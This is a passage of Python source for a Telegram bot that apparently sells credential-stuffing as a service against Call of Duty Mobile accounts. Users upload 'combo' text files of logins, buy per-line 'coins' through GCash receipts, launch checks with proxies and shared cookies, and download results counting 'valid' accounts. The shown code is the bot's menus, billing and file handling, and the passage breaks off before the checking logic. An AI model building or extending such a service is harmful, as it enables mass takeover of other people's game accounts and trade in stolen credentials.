            user = {"user_id": user_id, "username": username, "total_checked": 0, "coins": 0, "suspended_until": None, "suspend_reason": None, "daily_ad_count": 0, "last_ad_date": None, "daily_ad_coins": 0}
        else:
            user = dict(user_row)
        cursor.close()
        conn.close()
        return user
    return {"user_id": user_id, "username": username, "total_checked": 0, "coins": 0, "suspended_until": None, "suspend_reason": None, "daily_ad_count": 0, "last_ad_date": None, "daily_ad_coins": 0}

def update_user_stats(user_id, checked_count, coins_deduct_or_refund=0):
    conn = get_db()
    if conn:
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET total_checked = total_checked + ?, coins = coins + ? WHERE user_id = ?", (checked_count, coins_deduct_or_refund, user_id))
        conn.commit()
        cursor.close()
        conn.close()

def is_admin(user_id):
    return user_id in ADMIN_IDS

def check_access(user_id, chat_id=None):
    if is_admin(user_id):
        return True
        
    conn = get_db()
    if not conn:
        return False
        
    cursor = conn.cursor()
    
    cursor.execute("SELECT setting_value FROM settings WHERE setting_key = 'maintenance'")
    maint_setting = cursor.fetchone()
    if maint_setting and maint_setting['setting_value'] == 'on':
        if chat_id:
            try:
                bot.send_message(chat_id, "[ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ ]\n\nᴛʜᴇ ʙᴏᴛ ɪs ᴄᴜʀʀᴇɴᴛʟʏ ᴜɴᴅᴇʀ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ.")
            except Exception:
                pass
        cursor.close()
        conn.close()
        return False
        
    cursor.execute("SELECT suspended_until, suspend_reason FROM users WHERE user_id = ?", (user_id,))
    user = cursor.fetchone()
    if user and user.get('suspended_until'):
        suspension_date = user['suspended_until']
        if isinstance(suspension_date, str):
            try:
                suspension_date = datetime.strptime(suspension_date, "%Y-%m-%d %H:%M:%S.%f")
            except:
                try:
                    suspension_date = datetime.strptime(suspension_date, "%Y-%m-%d %H:%M:%S")
                except:
                    suspension_date = datetime.now() 

        if datetime.now() < suspension_date:
            if chat_id:
                try:
                    bot.send_message(chat_id, f"[ ᴀᴄᴄᴏᴜɴᴛ sᴜsᴘᴇɴᴅᴇᴅ ]\n\nʏᴏᴜʀ ᴀʀᴇ sᴜsᴘᴇɴᴅᴇᴅ ᴜɴᴛɪʟ: {user['suspended_until']}\nʀᴇᴀsᴏɴ: {user['suspend_reason']}\n\nɪғ ʏᴏᴜ ᴛʜɪɴᴋ ᴛʜɪs ɪs ᴀ ᴍɪsᴛᴀᴋᴇ, ᴋɪɴᴅʟʏ ᴄᴏɴᴛᴀᴄᴛ ᴛʜᴇ @Saltpapi656.")
                except Exception:
                    pass
            cursor.close()
            conn.close()
            return False
            
    cursor.close()
    conn.close()
    return True

def main_menu(user_id=None):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton(" sᴛᴀʀᴛ ᴄʜᴇᴄᴋɪɴɢ ", callback_data="start_check_menu"),
        InlineKeyboardButton(" ᴜᴘʟᴏᴀᴅ ᴛxᴛ ", callback_data="upload_combo"),
        InlineKeyboardButton(" ʟɪsᴛ ᴏғ ᴛxᴛ ", callback_data="list_combos"),
        InlineKeyboardButton(" ᴅᴏᴡɴʟᴏᴀᴅ ʀᴇsᴜʟᴛs ", callback_data="download_results"),
        InlineKeyboardButton(" ʙᴜʏ ᴄᴏɪɴ ", callback_data="buy_coins"),
        InlineKeyboardButton(" ɪɴᴠᴏɪᴄᴇs ", callback_data="user_invoices"),
        InlineKeyboardButton(" ᴘʀᴏғɪʟᴇ ", callback_data="profile")
    )
    if user_id and is_admin(user_id):
        markup.add(InlineKeyboardButton(" ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ ", callback_data="admin_panel"))
    markup.row(InlineKeyboardButton("[ ᴇxɪᴛ ]", callback_data="exit"))
    return markup

def get_bar(current, total, length=10):
    """Solid Black Block style na hindi nagbabago ang kulay"""
    if total <= 0: return "[░░░░░░░░░░]"
    filled_len = int(length * current // total)
    filled_len = max(0, min(length, filled_len))
    
    # Eto yung solid black block
    full_block = '█' 
    # Eto yung light shade para sa empty part para lalong lumitaw yung itim
    empty_block = '░' 
    
    bar = full_block * filled_len + empty_block * (length - filled_len)
    return f"[{bar}]"

def generate_stat_line(count, total, length=10):
    """Gumagawa ng stats line na may bar, count, at percentage"""
    if total <= 0: return "[░░░░░░░░░░] 0 (0.0%)"
    percent = (count / total) * 100
    bar = get_bar(count, total, length)
    return f"{bar} {count} ({percent:.1f}%)"
    
@bot.message_handler(commands=['start'])
def start_cmd(message):
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    
    if not check_access(user_id, message.chat.id):
        return
        
    setup_user_container(user_id)
    user = get_or_create_user(user_id, username)
    
    try:
        bot.send_message(
            message.chat.id,
            f"""🎮 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝙆𝘼𝙕𝙀 𝗖𝗢𝗗𝗠 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗕𝗢𝗧

[ ✓ ] SYSTEM ONLINE
[ ✓ ] SECURE CONNECTION
[ ✓ ] READY TO PROCESS

⚡ ᴛʜɪꜱ ʙᴏᴛ ᴘʀᴏᴠɪᴅᴇꜱ ꜰᴀꜱᴛ, ᴀᴄᴄᴜʀᴀᴛᴇ, ᴀɴᴅ ꜱᴇᴄᴜʀᴇ ᴄʜᴇᴄᴋɪɴɢ ꜰᴏʀ ʏᴏᴜʀ ꜰɪʟᴇꜱ.

📂 ꜱᴇɴᴅ ʏᴏᴜʀ .ᴛxᴛ ꜰɪʟᴇ ᴛᴏ ꜱᴛᴀʀᴛ ᴄʜᴇᴄᴋɪɴɢ

🔒 ᴇɴꜱᴜʀᴇ ʏᴏᴜʀ ꜰɪʟᴇ ɪꜱ ᴘʀᴏᴘᴇʀʟʏ ꜰᴏʀᴍᴀᴛᴛᴇᴅ

ʏᴏᴜʀ ʙᴀʟᴀɴᴄᴇ: {user.get('coins', 0)}

👑 𝕺𝖜𝖓𝖊𝖗: @Saltpapi656
🚀 Thank you for using saltpapi codm checker""",
            reply_markup=main_menu(user_id)
        )
    except Exception:
        pass


@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if not call.data.startswith(("deletefile_", "downloadfile_", "maint_", "proxy_", "delres_")):
        try:
            bot.answer_callback_query(call.id)
        except Exception:
            pass

    user_id = call.from_user.id
    username = call.from_user.username or "Unknown"
    
    if not check_access(user_id, call.message.chat.id):
        return
        
    setup_user_container(user_id)
    user = get_or_create_user(user_id, username)
    
    if call.data == "main_menu":
        try:
            bot.edit_message_text(
                f"""🎮 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 SALTPAPI 𝗖𝗢𝗗𝗠 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗕𝗢𝗧 🎮

👋 Welcome back to the main menu of @Saltpapi656 CODM Checker.

⚡ Fast • Accurate • Secure Checking System

📂 Use the menu buttons below to navigate and start checking.

💰 ᴄᴏɪɴ ʙᴀʟᴀɴᴄᴇ: {user.get('coins', 0)}""",
                call.message.chat.id,
                call.message.message_id,
                reply_markup=main_menu(user_id)
            )
        except Exception:
            pass

    elif call.data == "upload_combo":
        markup = InlineKeyboardMarkup()
        markup.row(
            InlineKeyboardButton("[ ᴄᴏᴅᴍ ]", callback_data="uptype_CODM")
        )
        markup.row(InlineKeyboardButton("ʙᴀᴄᴋ", callback_data="main_menu"))
        try:
            bot.edit_message_text(
                "ᴘʟᴇᴀsᴇ sᴇʟᴇᴄᴛ ᴛʜᴇ ᴄʜᴇᴄᴋᴇʀ ᴛʏᴘᴇ ғᴏʀ ʏᴏᴜʀ ᴜᴘʟᴏᴀᴅ.",
                call.message.chat.id, call.message.message_id, reply_markup=markup
            )
        except Exception:
            pass

    elif call.data.startswith("uptype_"):
        ctype = call.data.split("_")[1]
        try:
            msg = bot.edit_message_text(f"ᴋɪɴᴅʟʏ sᴇɴᴅ ʏᴏᴜʀ {ctype} ᴛxᴛ ғɪʟᴇ.\n\nɴᴏᴛᴇ: sᴇɴᴅɪɴɢ ᴛᴇxᴛ ɪɴsᴛᴇᴀᴅ ᴏғ ᴀ ғɪʟᴇ ᴡɪʟʟ ᴄᴀɴᴄᴇʟ ᴛʜɪs ᴘʀᴏᴄᴇss.", call.message.chat.id, call.message.message_id)
            bot.clear_step_handler_by_chat_id(call.message.chat.id)
            bot.register_next_step_handler(msg, process_upload, ctype)
        except Exception:
            pass

    elif call.data == "list_combos":
        markup = InlineKeyboardMarkup()
        markup.row(
            InlineKeyboardButton("[ ᴄᴏᴅᴍ ]", callback_data="listtype_CODM")
        )
        markup.row(InlineKeyboardButton("ʙᴀᴄᴋ", callback_data="main_menu"))
        try:
            bot.edit_message_text("sᴇʟᴇᴄᴛ ᴀ ᴄʜᴇᴄᴋᴇʀ ᴛʏᴘᴇ ᴛᴏ ᴠɪᴇᴡ ᴜᴘʟᴏᴀᴅᴇᴅ ғɪʟᴇs:", call.message.chat.id, call.message.message_id, reply_markup=markup)
        except Exception:
            pass

    elif call.data.startswith("listtype_"):
        ctype = call.data.split("_")[1]
        conn = get_db()
        if conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM files WHERE user_id = ? AND checker_type = ?", (user_id, ctype))
            files = cursor.fetchall()
            cursor.close()
            conn.close()

            if not files:
                markup = InlineKeyboardMarkup()
                markup.add(InlineKeyboardButton("ʙᴀᴄᴋ", callback_data="list_combos"))
                try:
                    bot.edit_message_text(f"ʏᴏᴜ ᴅᴏ ɴᴏᴛ ʜᴀᴠᴇ ᴀɴʏ ᴜᴘʟᴏᴀᴅᴇᴅ {ctype} ᴛxᴛ ғɪʟᴇs ʏᴇᴛ.", call.message.chat.id, call.message.message_id, reply_markup=markup)
                except Exception:
                    pass
            else:
                markup = InlineKeyboardMarkup(row_width=2)
                buttons = []
                for f in files:
                    buttons.append(InlineKeyboardButton(f['filename'], callback_data=f"fileinfo_{f['id']}"))
                markup.add(*buttons)
                markup.row(InlineKeyboardButton(" ʙᴀᴄᴋ ", callback_data="list_combos"))
                try:
                    bot.edit_message_text(f"[ ʏᴏᴜʀ {ctype} ᴄᴏᴍʙᴏs ]\n\n• sᴇʟᴇᴄᴛ ᴀ ғɪʟᴇ ᴛᴏ ᴠɪᴇᴡ ɪᴛs ᴅᴇᴛᴀɪʟs.", call.message.chat.id, call.message.message_id, reply_markup=markup)
                except Exception:
                    pass

    elif call.data.startswith("fileinfo_"):
        file_id = call.data.split("_")[1]
        conn = get_db()
        if conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM files WHERE id = ? AND user_id = ?", (file_id, user_id))
            file_info = cursor.fetchone()
            cursor.close()
            conn.close()

            if file_info:
                size_kb = file_info['file_size'] / 1024
                size_str = f"{size_kb:.2f} KB" if size_kb < 1024 else f"{size_kb/1024:.2f} MB"
                ctype = file_info.get('checker_type', 'CODM')
                
                text = f"[ ᴛxᴛ ғɪʟᴇ ɪɴғᴏ ]\n" \
                       f"• ғɪʟᴇ ɴᴀᴍᴇ: {file_info['filename']}\n" \
                       f"• ᴛʏᴘᴇ: {ctype}\n" \
                       f"• ғɪʟᴇ sɪᴢᴇ: {size_str}\n" \
                       f"• ᴅᴀᴛᴇ ᴜᴘʟᴏᴀᴅᴇᴅ: {file_info['date_uploaded']}\n" \
                       f"• sᴛᴀᴛᴜs: {file_info['status']}"
                
                markup = InlineKeyboardMarkup(row_width=2)
                markup.add(
                    InlineKeyboardButton("[ ᴅᴇʟᴇᴛᴇ ]", callback_data=f"deletefile_{file_id}"),
                    InlineKeyboardButton("[ ᴅᴏᴡɴʟᴏᴀᴅ ]", callback_data=f"downloadfile_{file_id}")
                )
                markup.row(InlineKeyboardButton("[ ʙᴀᴄᴋ ]", callback_data=f"listtype_{ctype}"))
                try:
                    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup)
                except Exception:
                    pass

    elif call.data.startswith("deletefile_"):
        file_id = call.data.split("_")[1]
        conn = get_db()
        if conn:
            cursor = conn.cursor()
            cursor.execute("SELECT filepath FROM files WHERE id = ? AND user_id = ?", (file_id, user_id))
            f = cursor.fetchone()
            if f and os.path.exists(f['filepath']):
                os.remove(f['filepath'])
            cursor.execute("DELETE FROM files WHERE id = ? AND user_id = ?", (file_id, user_id))
            conn.commit()
            cursor.close()
            conn.close()
        try:
            bot.answer_callback_query(call.id, "File has been successfully deleted.")
        except Exception:
            pass
        call.data = "list_combos"
        callback_handler(call)

    elif call.data.startswith("downloadfile_"):
        file_id = call.data.split("_")[1]
        conn = get_db()
        if conn:
            cursor = conn.cursor()
            cursor.execute("SELECT filepath FROM files WHERE id = ? AND user_id = ?", (file_id, user_id))
            f = cursor.fetchone()
            cursor.close()
            conn.close()
            if f and os.path.exists(f['filepath']):
                try:
                    bot.send_document(call.message.chat.id, open(f['filepath'], 'rb'))
                except Exception:
                    pass
            else:
                try:
                    bot.answer_callback_query(call.id, "File not found on server.")
                except Exception:
                    pass

    elif call.data == "download_results":
        results_dir = f"Containers/{user_id}/Results"
        if not os.path.exists(results_dir):
            os.makedirs(results_dir, exist_ok=True)
            
        folders = [f for f in os.listdir(results_dir) if os.path.isdir(os.path.join(results_dir, f))]
        
        if not folders:
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("[ ʙᴀᴄᴋ ]", callback_data="main_menu"))
            try:
                bot.edit_message_text("ʏᴏᴜ ᴅᴏ ɴᴏᴛ ʜᴀᴠᴇ ᴀɴʏ ʀᴇsᴜʟᴛs ʏᴇᴛ.", call.message.chat.id, call.message.message_id, reply_markup=markup)
            except Exception:
                pass
        else:
            markup = InlineKeyboardMarkup(row_width=2)
            buttons = []
            for idx, folder in enumerate(folders):
                buttons.append(InlineKeyboardButton(folder, callback_data=f"resultdl_{idx}"))
            markup.add(*buttons)
            markup.row(InlineKeyboardButton("[ ʙᴀᴄᴋ ]", callback_data="main_menu"))
            try:
                bot.edit_message_text("[ ʏᴏᴜʀ ʀᴇsᴜʟᴛs ]\n\n• sᴇʟᴇᴄᴛ ᴀ ғᴏʟᴅᴇʀ ᴛᴏ ᴅᴏᴡɴʟᴏᴀᴅ ᴏʀ ᴅᴇʟᴇᴛᴇ:", call.message.chat.id, call.message.message_id, reply_markup=markup)
            except Exception:
                pass

    elif call.data.startswith("resultdl_"):
        folder_idx = int(call.data.split("_")[1])
        results_dir = f"Containers/{user_id}/Results"
        folders = [f for f in os.listdir(results_dir) if os.path.isdir(os.path.join(results_dir, f))]
        if folder_idx < len(folders):
            folder_name = folders[folder_idx]
            markup = InlineKeyboardMarkup(row_width=2)
            markup.add(
                InlineKeyboardButton("[ ᴄᴏɴғɪʀᴍ ]", callback_data=f"confdl_{folder_name}"),
                InlineKeyboardButton("[ ᴅᴇʟᴇᴛᴇ ]", callback_data=f"delres_{folder_name}")
            )
            markup.row(InlineKeyboardButton("[ ʙᴀᴄᴋ ]", callback_data="download_results"))
            try:
                bot.edit_message_text(f"ᴀʀᴇ ʏᴏᴜ sᴜʀᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴅᴏᴡɴʟᴏᴀᴅ: {folder_name}?", call.message.chat.id, call.message.message_id, reply_markup=markup)
            except Exception:
                pass

    elif call.data.startswith("delres_"):
        folder_name = call.data.split("delres_")[1]
        folder_path = os.path.join(f"Containers/{user_id}/Results", folder_name)
        zip_path = folder_path + ".zip"
        
        try:
            if os.path.exists(folder_path):
                shutil.rmtree(folder_path)
            if os.path.exists(zip_path):
                os.remove(zip_path)
            bot.answer_callback_query(call.id, "Result folder deleted successfully.")
        except Exception:
            pass
        
        call.data = "download_results"
        callback_handler(call)

    elif call.data.startswith("confdl_"):
        folder_name = call.data.split("confdl_")[1]
        folder_path = os.path.join(f"Containers/{user_id}/Results", folder_name)
        zip_path = folder_path + ".zip"
        
        try:
            bot.edit_message_text("ᴄᴏᴍᴘʀᴇssɪɴɢ ʏᴏᴜʀ ʀᴇsᴜʟᴛs, ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ...", call.message.chat.id, call.message.message_id)
        except Exception:
            pass
            
        if not os.path.exists(zip_path):
            shutil.make_archive(folder_path, 'zip', folder_path)
            
        file_size = os.path.getsize(zip_path)
        if file_size > 40 * 1024 * 1024:
            try:
                bot.edit_message_text(f"ᴛʜᴇ ғɪʟᴇ ɪs ᴛᴏᴏ ʟᴀʀɢᴇ ғᴏʀ ᴛᴇʟᴇɢʀᴀᴍ ({file_size/1024/1024:.2f} MB).", call.message.chat.id, call.message.message_id)
            except Exception:
                pass
        else:
            try:
                bot.send_document(call.message.chat.id, open(zip_path, 'rb'))
                bot.edit_message_text("ғɪʟᴇ ʜᴀs ʙᴇᴇɴ sᴜᴄᴄᴇssғᴜʟʟʏ sᴇɴᴛ.", call.message.chat.id, call.message.message_id)
            except Exception:
                pass

    elif call.data == "buy_coins":
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("10 ᴘʜᴘ ғᴏʀ 250 ᴄᴏɪɴs", callback_data="buy_10_250"),
            InlineKeyboardButton("50 ᴘʜᴘ ғᴏʀ 2000 ᴄᴏɪɴs", callback_data="buy_50_2000"),
            InlineKeyboardButton("100 ᴘʜᴘ ғᴏʀ 5000 ᴄᴏɪɴs", callback_data="buy_100_5000"),
            InlineKeyboardButton("200 ᴘʜᴘ ғᴏʀ 12000 ᴄᴏɪɴs", callback_data="buy_200_12000"),
            InlineKeyboardButton("ᴄᴜsᴛᴏᴍ ᴏʀᴅᴇʀ (210+ ᴘʜᴘ)", callback_data="buy_custom")
        )
        markup.row(InlineKeyboardButton("[ ʙᴀᴄᴋ ]", callback_data="main_menu"))
        try:
            bot.edit_message_text("[ ʙᴜʏ ᴄᴏɪɴs ]\n\n• sᴇʟᴇᴄᴛ ᴀ ᴘᴀᴄᴋᴀɢᴇ ʙᴇʟᴏᴡ.", call.message.chat.id, call.message.message_id, reply_markup=markup)
        except Exception:
            pass

    elif call.data.startswith("buy_") and call.data != "buy_coins" and call.data != "buy_custom":
        parts = call.data.split("_")
        amount = parts[1]
        coins = parts[2]
        
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("[ ᴄᴏɴғɪʀᴍ ]", callback_data=f"confbuy_{amount}_{coins}"),
            InlineKeyboardButton("[ ᴄᴀɴᴄᴇʟ ]", callback_data="buy_coins")
        )
        try:
            bot.edit_message_text(f"[ ᴏʀᴅᴇʀ sᴜᴍᴍᴀʀʏ ]\n\n• ᴀᴍᴏᴜɴᴛ: {amount} ᴘʜᴘ\n• ᴄᴏɪɴs: {coins}\n\nᴅᴏ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴘʀᴏᴄᴇᴇᴅ?", call.message.chat.id, call.message.message_id, reply_markup=markup)
        except Exception:
            pass

    elif call.data == "buy_custom":
        try:
            msg = bot.edit_message_text("ᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ᴀᴍᴏᴜɴᴛ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ʙᴜʏ. ᴍᴜsᴛ ʙᴇ ʜɪɢʜᴇʀ ᴛʜᴀɴ 210 PHP.", call.message.chat.id, call.message.message_id)
            bot.clear_step_handler_by_chat_id(call.message.chat.id)
            bot.register_next_step_handler(msg, process_custom_order)
        except Exception:
            pass

    elif call.data.startswith("confbuy_"):
        parts = call.data.split("_")
        amount = parts[1]
        coins = parts[2]
        
        text = f"ᴋɪɴᴅʟʏ ᴄᴏɴᴛᴀᴄᴛ @Saltpapi656 ғᴏʀ ɢᴄᴀsʜ ɪɴғᴏʀᴍᴀᴛɪᴏɴ.\n\n" \
               f"• ɴᴏᴛᴇ: ᴅᴏ ɴᴏᴛ ᴄᴏɴғɪʀᴍ ʏᴇᴛ. ᴄᴏɴᴛᴀᴄᴛ Saltpapi ғɪʀsᴛ, ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴅᴇᴛᴀɪʟs, ᴛʜᴇɴ ᴘʀᴏᴄᴇᴇᴅ ᴡɪᴛʜ ᴘᴀʏᴍᴇɴᴛ."
               
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("[ ᴄᴏɴғɪʀᴍ & sᴇɴᴅ ʀᴇᴄɪᴇᴘᴛ ]", callback_data=f"receipt_{amount}_{coins}"),
            InlineKeyboardButton("[ ᴄᴀɴᴄᴇʟ ]", callback_data="buy_coins")
        )
        try:
            bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup)
        except Exception:
            pass

    elif call.data.startswith("receipt_"):
        parts = call.data.split("_")
        amount = parts[1]
        coins = parts[2]
        try:
            msg = bot.edit_message_text("ᴋɪɴᴅʟʏ sᴇɴᴅ ᴀ ᴘʜᴏᴛᴏ ᴏғ ʏᴏᴜʀ ɢᴄᴀsʜ ʀᴇᴄᴇɪᴘᴛ:", call.message.chat.id, call.message.message_id)
            bot.clear_step_handler_by_chat_id(call.message.chat.id)
            bot.register_next_step_handler(msg, process_receipt, amount, coins)
        except Exception:
            pass

    elif call.data == "user_invoices":
        conn = get_db()
        if conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM invoices WHERE user_id = ? ORDER BY created_at DESC", (user_id,))
            invoices = cursor.fetchall()
            cursor.close()
            conn.close()
            
            if not invoices:
                markup = InlineKeyboardMarkup()
                markup.row(InlineKeyboardButton("[ ʙᴀᴄᴋ ]", callback_data="main_menu"))
                try:
                    bot.edit_message_text("ʏᴏᴜ ᴅᴏ ɴᴏᴛ ʜᴀᴠᴇ ᴀɴʏ ɪɴᴠᴏɪᴄᴇs ʏᴇᴛ.", call.message.chat.id, call.message.message_id, reply_markup=markup)
                except Exception:
                    pass
            else:
                markup = InlineKeyboardMarkup(row_width=2)
                buttons = []
                for inv in invoices:
                    buttons.append(InlineKeyboardButton(f"ɪɴᴠ #{inv['id']} | {inv['amount_php']} ᴘʜᴘ | {inv['status']}", callback_data=f"viewinv_{inv['id']}"))
                markup.add(*buttons)
                markup.row(InlineKeyboardButton("[ ʙᴀᴄᴋ ]", callback_data="main_menu"))
                try:
                    bot.edit_message_text("[ ʏᴏᴜʀ ɪɴᴠᴏɪᴄᴇs ]", call.message.chat.id, call.message.message_id, reply_markup=markup)
                except Exception:
                    pass

    elif call.data.startswith("viewinv_"):
        inv_id = call.data.split("_")[1]
        conn = get_db()
        if conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM invoices WHERE id = ?", (inv_id,))
            inv = cursor.fetchone()
            cursor.close()
            conn.close()
            
            if inv:
                text = f"• ɪɴᴠᴏɪᴄᴇ ɪᴅ: {inv['id']}\n\n" \
                       f"• ᴜsᴇʀɴᴀᴍᴇ: {inv['username']}\n" \
                       f"• ᴀᴍᴏᴜɴᴛ: {inv['amount_php']} PHP\n" \
                       f"• ᴄᴏɪɴs ʀᴇᴏ̨ᴜᴇsᴛᴇᴅ: {inv['coins']}\n" \
                       f"• sᴛᴀᴛᴜs: {inv['status']}\n"
                
                if inv['status'] == 'Declined' and inv['decline_reason']:
                    text += f"ᴅᴇᴄʟɪɴᴇ: {inv['decline_reason']}\n"
                    
                markup = InlineKeyboardMarkup()
                markup.row(InlineKeyboardButton("[ ʙᴀᴄᴋ ]", callback_data="user_invoices"))
                try:
                    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup)
                except Exception:
                    pass
        
    elif call.data == "profile":
        text = f"[ ʏᴏᴜʀ ᴘʀᴏғɪʟᴇ ]\n\n" \
               f"ᴜsᴇʀɴᴀᴍᴇ: {user['username']}\n" \
               f"ᴜsᴇʀ ɪᴅ: {user['user_id']}\n" \
               f"ᴄᴏɪɴs: {user.get('coins', 0)}\n" \
               f"ᴛᴏᴛᴀʟ ᴠᴀʟɪᴅ ᴀᴄᴄ: {user['total_checked']}"
        markup = InlineKeyboardMarkup()
        markup.row(InlineKeyboardButton("[ ʙᴀᴄᴋ ]", callback_data="main_menu"))
        try:
            bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup)
        except Exception:
            pass

    elif call.data == "start_check_menu":
        markup = InlineKeyboardMarkup()
        markup.row(
            InlineKeyboardButton("[ ᴄᴏᴅᴍ ]", callback_data="starttype_CODM")
        )
        markup.row(InlineKeyboardButton("[ ʙᴀᴄᴋ ]", callback_data="main_menu"))
        try:
            bot.edit_message_text("• sᴇʟᴇᴄᴛ ᴛʏᴘᴇ ᴏғ ᴄʜᴇᴄᴋᴇʀ ᴛᴏ ᴘʀᴏᴄᴇᴇᴅ.", call.message.chat.id, call.message.message_id, reply_markup=markup)
        except Exception:
            pass

    elif call.data.startswith("starttype_"):
        ctype = call.data.split("_")[1]
        conn = get_db()
        if conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM files WHERE user_id = ? AND checker_type = ?", (user_id, ctype))
            files = cursor.fetchall()
            cursor.close()
            conn.close()

            if not files:
                markup = InlineKeyboardMarkup()
                markup.row(InlineKeyboardButton("[ ʙᴀᴄᴋ ]", callback_data="start_check_menu"))
                try:
                    bot.edit_message_text(f"ʏᴏᴜ ᴍᴜsᴛ ᴜᴘʟᴏᴀᴅ ᴀ {ctype} ᴛxᴛ ғɪʟᴇ ғɪʀsᴛ ᴛᴏ sᴛᴀʀᴛ ᴄʜᴇᴄᴋɪɴɢ.", call.message.chat.id, call.message.message_id, reply_markup=markup)
                except Exception:
                    pass
            else:
                markup = InlineKeyboardMarkup(row_width=2)
                buttons = []
                for f in files:
                    buttons.append(InlineKeyboardButton(f['filename'], callback_data=f"checkfile_{f['id']}"))
                markup.add(*buttons)
                markup.row(InlineKeyboardButton("[ ʙᴀᴄᴋ ]", callback_data="start_check_menu"))
                try:
                    bot.edit_message_text(f"[ sᴛᴀʀᴛ ᴄʜᴇᴄᴋɪɴɢ ]\n• sᴇʟᴇᴄᴛ ᴀ {ctype} ғɪʟᴇ ᴛᴏ ᴄʜᴇᴄᴋ.", call.message.chat.id, call.message.message_id, reply_markup=markup)
                except Exception:
                    pass

    elif call.data.startswith("checkfile_"):
        file_id = call.data.split("_")[1]
        conn = get_db()
        if conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM files WHERE id = ? AND user_id = ?", (file_id, user_id))
            file_info = cursor.fetchone()
            cursor.close()
            conn.close()

            if file_info:
                file_path = file_info['filepath']
                ctype = file_info.get('checker_type', 'CODM')
                try:
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        line_count = sum(1 for line in f if line.strip())
                except:
                    line_count = 0
                
                size_kb = file_info['file_size'] / 1024
                size_str = f"{size_kb:.2f} KB" if size_kb < 1024 else f"{size_kb/1024:.2f} MB"
                
                user_coins = user.get('coins', 0)
                
                text = f"• ғɪʟᴇ ɴᴀᴍᴇ: {file_info['filename']}\n" \
                       f"• ᴛᴀʀɢᴇᴛ: {ctype}\n" \
                       f"• ғɪʟᴇ sɪᴢᴇ: {size_str}\n" \
                       f"• ᴛᴏᴛᴀʟ ʟɪɴᴇs: {line_count}\n" \
                       f"• ʏᴏᴜʀ ᴄᴏɪɴs: {user_coins}\n\n" \
                       f"• ᴀʀᴇ ʏᴏᴜ sᴜʀᴇ ᴛʜɪs ɪs ᴛʜᴇ ᴛᴇxᴛ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴄʜᴇᴄᴋ?\n"
                       
                if user_coins < line_count:
                    text += f"ɴᴏᴛᴇ: ʏᴏᴜ ᴏɴʟʏ ʜᴀᴠᴇ {user_coins} ᴄᴏɪɴs, sᴏ ᴏɴʟʏ {user_coins} ʟɪɴᴇs ᴡɪʟʟ ʙᴇ ᴄʜᴇᴄᴋᴇᴅ."
                
                markup = InlineKeyboardMarkup(row_width=2)
                markup.add(
                    InlineKeyboardButton("[ ᴄᴏɴғɪʀᴍ ]", callback_data=f"launchcheck_{file_id}"),
                    InlineKeyboardButton("[ ʙᴀᴄᴋ ]", callback_data=f"starttype_{ctype}")
                )
                try:
                    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup)
                except Exception:
                    pass

    elif call.data.startswith("launchcheck_"):
        if active_checks.get(user_id, False):
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("[ sᴛᴏᴘ ᴄʜᴇᴄᴋɪɴɢ ]", callback_data="stop_checking"))
            markup.row(InlineKeyboardButton("[ ʙᴀᴄᴋ ]", callback_data="main_menu"))
            try:
                bot.edit_message_text("ᴀ ғɪʟᴇ ɪs ᴀʟʀᴇᴀᴅʏ ʙᴇɪɴɢ ᴄʜᴇᴄᴋᴇᴅ ʀɪɢʜᴛ ɴᴏᴡ. ᴋɪɴᴅʟʏ sᴛᴏᴘ ᴛʜᴀᴛ ᴘʀᴏᴄᴇss ᴛᴏ ᴘʀᴏᴄᴇᴇᴅ ɪɴ ʟᴀᴜɴᴄʜɪɴɢ ᴀ ɴᴇᴡ ᴘʀᴏss.", call.message.chat.id, call.message.message_id, reply_markup=markup)
            except Exception: pass
            return

        active_checks[user_id] = True 
        stop_event = Event()
        stop_events[user_id] = stop_event

        file_id = call.data.split("_")[1]
        conn = get_db()
        file_info = None
        proxy_status = 'off'
        if conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM files WHERE id = ? AND user_id = ?", (file_id, user_id))
            file_info = cursor.fetchone()
            
            cursor.execute("SELECT setting_value FROM settings WHERE setting_key = 'proxy_status'")
            res = cursor.fetchone()
            if res:
                proxy_status = res.get('setting_value', 'off')
                
            cursor.close()
            conn.close()

        if not file_info:
            active_checks[user_id] = False
            return

        global_cookie = "Global_Assets/cookies.txt"
        try:
